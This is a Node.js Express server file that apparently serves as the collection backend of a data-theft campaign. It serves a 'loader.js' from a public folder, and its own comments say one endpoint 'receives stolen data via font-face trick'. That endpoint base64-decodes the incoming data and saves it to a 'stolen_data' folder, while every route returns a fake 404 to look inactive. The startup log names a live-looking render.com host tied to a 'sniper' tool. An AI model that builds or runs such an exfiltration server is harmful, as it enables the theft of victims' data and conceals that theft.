const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

// === IMPORTANT: Serve static files from public folder ===
app.use('/axiom', express.static(path.join(__dirname, 'public/axiom')));

// Root and /i routes (to mimic original behavior)
app.get('/', (req, res) => {
    res.status(404).send('Not Found');
});

app.get('/i', (req, res) => {
    res.status(404).json({ detail: "Not Found" });
});

// The important endpoint that receives stolen data via font-face trick
app.get('/i/:data', (req, res) => {
    const encoded = req.params.data;
    let payload = {};

    try {
        const jsonString = Buffer.from(encoded, 'base64').toString();
        payload = JSON.parse(jsonString);

        console.log('✅ DATA RECEIVED:', JSON.stringify(payload, null, 2));

        // Save to file
        const logDir = path.join(__dirname, 'stolen_data');
        if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);

        const filename = `stolen_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
        fs.writeFileSync(path.join(logDir, filename), JSON.stringify(payload, null, 2));

        console.log(`💾 SAVED: stolen_data/${filename}`);
    } catch (e) {
        console.error('❌ Decode error:', e.message);
    }

    res.status(404).json({ detail: "Not Found" });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Loader should be available at: https://bloom-sniper-backend.onrender.com/axiom/loader.js`);
});